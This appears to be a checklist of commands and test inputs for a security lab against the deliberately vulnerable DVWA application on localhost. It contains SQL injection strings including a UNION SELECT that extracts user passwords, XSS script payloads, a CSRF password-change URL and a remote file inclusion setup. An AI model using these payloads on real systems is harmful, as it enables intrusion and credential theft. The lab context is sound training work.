# Commands, Test Inputs, and Evidence Checklist

## Lab / Docker

```bash
cd /root/DVWA
docker ps
docker compose up -d
docker exec -it dvwa-dvwa-1 bash
exit
```

## Database

```bash
docker exec -it dvwa-db-1 mariadb -u dvwa -p dvwa
```

```sql
DESCRIBE users;
SELECT user_id, first_name, last_name, user FROM users;
exit;
```

## Source Inspection

```bash
cd /root/DVWA
cat vulnerabilities/sqli/source/low.php
cat vulnerabilities/sqli/source/impossible.php
cat vulnerabilities/xss_s/source/low.php
cat vulnerabilities/xss_s/source/impossible.php
cat vulnerabilities/xss_r/source/low.php
cat vulnerabilities/xss_r/source/impossible.php
cat vulnerabilities/csrf/source/low.php
cat vulnerabilities/csrf/source/high.php
cat vulnerabilities/fi/source/low.php
```

## SQLi Inputs

```text
1
1'
1' ORDER BY 1 #
1' ORDER BY 2 #
1' ORDER BY 3 #
1' OR 1=1 ORDER BY 2 #
1' UNION SELECT user,password FROM users #
```

## Stored XSS

```html
<script>alert('Stored XSS')</script>
```

## Reflected XSS

```html
<script>alert('Reflected XSS')</script>
```

## CSRF

```text
http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=CSRFTest123&password_conf=CSRFTest123&Change=Change
```

## RFI Lab Preparation

```bash
printf 'allow_url_include=On\n' > /usr/local/etc/php/conf.d/rfi-lab.ini
php -i | grep -E "allow_url_include|allow_url_fopen"
docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' dvwa-dvwa-1
mkdir -p /tmp/rfi-web
printf '%s\n' '<?php echo "RFI_TEST_SUCCESS"; ?>' > /tmp/rfi-web/rfi-test.php
python3 -m http.server 8000 --bind 0.0.0.0 --directory /tmp/rfi-web
docker exec -it dvwa-dvwa-1 php -r 'var_dump(file_get_contents("http://172.18.0.1:8000/rfi-test.php"));'
```

RFI request used in the lab:

```text
http://127.0.0.1:4280/vulnerabilities/fi/?page=http://172.18.0.1:8000/rfi-test.php
```

Rollback:

```bash
rm /usr/local/etc/php/conf.d/rfi-lab.ini
apache2ctl -k graceful
php -i | grep -E "allow_url_include|allow_url_fopen"
```

## CSP Verification Used During Testing

```bash
curl -sI http://127.0.0.1:4280/ | grep -i "Content-Security-Policy"
```

## Apache Header Verification

```bash
curl -sI http://127.0.0.1:4280/ | grep -Ei 'X-Content-Type-Options|X-Frame-Options|Referrer-Policy|Permissions-Policy'
```

## Recommended Evidence Filenames

```text
01-sqli-baseline.png
02-sqli-syntax-error.png
03-sqli-order-by-3.png
04-sqli-all-rows.png
05-sqli-union-extraction.png
06-sqli-secure-code.png
07-sqli-secure-retest.png
08-stored-xss-popup.png
09-stored-xss-secure-code.png
10-reflected-xss-popup.png
11-reflected-xss-vulnerable-code.png
12-reflected-xss-mitigated.png
13-csrf-low-request.png
14-csrf-password-changed.png
15-csrf-high-token.png
16-csrf-token-rejected.png
17-lfi-passwd.png
18-rfi-success.png
19-burp-intercept-login.png
20-burp-intruder-results.png
21-securityheaders-report.png
22-apache-security-headers.png
23-browser-response-headers.png
```

## Screenshot Redaction

Before publishing to GitHub, redact:

- Passwords.
- Password hashes.
- Session cookies.
- CSRF tokens.
- Authentication headers.
- Any unrelated personal information.
